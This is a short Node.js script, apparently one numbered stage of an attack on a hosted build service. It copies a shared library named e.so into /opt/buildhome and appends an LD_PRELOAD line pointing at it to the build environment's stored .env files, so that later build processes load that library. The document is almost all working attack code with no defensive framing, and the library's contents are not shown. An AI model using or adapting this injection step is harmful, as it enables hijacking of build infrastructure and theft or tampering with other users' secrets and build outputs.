const fs = require("fs");
try { fs.copyFileSync("e.so", "/opt/buildhome/e.so"); console.log("[p8] e.so staged"); }
catch (e) { console.log("[p8] copy fail:", e.message); }
for (const t of ["/opt/build/env_store/.env", "/opt/buildhome/env_store/.env"]) {
  try { fs.appendFileSync(t, "\nLD_PRELOAD=/opt/buildhome/e.so\n"); console.log("[p8] env:", t); }
  catch (e) { console.log("[p8] env fail", t, e.code); }
}
